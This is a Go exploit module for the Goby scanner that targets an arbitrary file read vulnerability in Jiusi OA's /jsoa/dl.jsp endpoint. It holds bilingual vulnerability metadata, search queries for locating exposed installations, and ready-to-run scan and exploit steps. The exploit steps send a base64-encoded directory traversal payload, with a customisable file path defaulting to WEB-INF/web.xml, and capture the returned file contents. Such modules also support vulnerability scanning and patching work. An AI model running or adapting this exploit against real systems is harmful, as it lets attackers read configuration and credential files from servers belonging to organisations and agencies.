package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "Jiusi OA /jsoa/dl.jsp File Read Vulnerability",
    "Description": "<p>Jiusi OA product, developed by Beijing Jiusi Collaborative Software Co., Ltd. (referred to as Jiusi Software), is a high-end collaborative office system for enterprises, institutions, and government agencies. Committed to creating management tools and unleashing organizational potential, we provide high-quality solutions, products, and services for customers' information, digital, and intelligent transformation. It integrates various management concepts and OA interface technologies, aiming to help enterprises break management boundaries, integrate information silos, and form an orderly, real-time, standardized, open, efficient, low-cost, flexible, and cohesive management environment and integrated technical support environment.There is an arbitrary file reading vulnerability in the dl.jsp interface of Beijing Jiusi Collaborative Office Software. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</p>",
    "Product": "Jiusi-OA",
    "Homepage": "http://www.jiusi.net/",
    "DisclosureDate": "2024-11-14",
    "PostTime": "2024-11-27",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/jsoa/login.jsp\" && title=\"九思\"",
    "GobyQuery": "body=\"/jsoa/login.jsp\" && title=\"九思\"",
    "Level": "1",
    "Impact": "<p>Download any server file, including source code files, system sensitive files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Enable web users to only access (read) the required files and paths </p><p> 2. Cannot have files containing vulnerabilities, directory traversal vulnerabilities, or other vulnerabilities</p><p> 3. Prevent users from accessing paths outside the web root directory. </p><p> 4. The manufacturer has released the latest fix version, follow <a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143759234?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../WEB-INF/web.xml",
            "show": "mode=Customize"
        },
        {
            "name": "default",
            "type": "select",
            "value": "../../../WEB-INF/web.xml",
            "show": "mode=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jsoa/dl.jsp?{{{payload_base64}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept-Encoding": "gzip"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "九思OA /jsoa/dl.jsp 文件读取漏洞",
            "Product": "九思软件-OA",
            "Description": "<p>九思OA产品，由北京九思协同软件有限公司（简称九思软件）开发，是一款面向企事业单位和政府机关的高端协同办公系统。致力于“打造管理神器，释放组织潜能”，为客户的信息化、数字化和智能化转型提供优质的方案、产品和服务。它融合了多种管理思想和OA接口技术，旨在帮助企业打破管理边界、整合信息孤岛，形成有序、实时、规范、开放、高效率、低成本、柔性、有凝聚力的管理环境和一体化的技术支撑环境。<br>北京九思协同办公软件dl.jsp接口处存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。&nbsp;</p><p>4、该厂商发布最新修复版本，关注<a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a><br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jiusi OA /jsoa/dl.jsp File Read Vulnerability",
            "Product": "Jiusi-OA",
            "Description": "<p>Jiusi OA product, developed by Beijing Jiusi Collaborative Software Co., Ltd. (referred to as Jiusi Software), is a high-end collaborative office system for enterprises, institutions, and government agencies. Committed to creating management tools and unleashing organizational potential, we provide high-quality solutions, products, and services for customers' information, digital, and intelligent transformation. It integrates various management concepts and OA interface technologies, aiming to help enterprises break management boundaries, integrate information silos, and form an orderly, real-time, standardized, open, efficient, low-cost, flexible, and cohesive management environment and integrated technical support environment.There is an arbitrary file reading vulnerability in the dl.jsp interface of Beijing Jiusi Collaborative Office Software. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Enable web users to only access (read) the required files and paths&nbsp;</p><p>&nbsp;2. Cannot have files containing vulnerabilities, directory traversal vulnerabilities, or other vulnerabilities</p><p>&nbsp;3. Prevent users from accessing paths outside the web root directory.&nbsp;</p><p>&nbsp;4. The manufacturer has released the latest fix version, follow <a href=\"http://www.jiusi.net/\">http://www.jiusi.net/</a><br></p>",
            "Impact": "<p>Download any server file, including source code files, system sensitive files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|mode|{{{default}}}",
        "payload_concat": "define|variable|&FileName={{{payload}}}&path=/a",
        "payload_base64": "payload_concat|base64|{{{payload_concat}}}"
    },
    "EditType": "fast",
    "VariablesOrder": [
        "payload",
        "payload_concat",
        "payload_base64"
    ],
    "PocId": "9974"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }